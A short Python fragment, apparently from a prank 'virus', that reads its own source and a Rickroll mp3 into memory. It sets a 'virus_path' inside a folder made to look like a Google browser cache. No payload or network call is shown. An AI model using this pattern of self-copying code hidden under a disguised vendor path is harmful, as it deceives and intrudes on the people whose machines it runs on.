...
files_to_backup = [
  (__file__, __file__),
  (r"%USERPROFILE%\Downloads\Google_Stable_x64\assets\cache\youtube_com-watch-dQw4w9WgXcQ.mp3", r"%USERPROFILE%\Music\youtube_com-watch-dQw4w9WgXcQ.mp3")
]

backuped_files = [open(path, "rb").read() for path, _ in files_to_backup]

virus_path = r"%USERPROFILE%\Downloads\Google_Stable_x64\assets\cache\youtube_com.py"
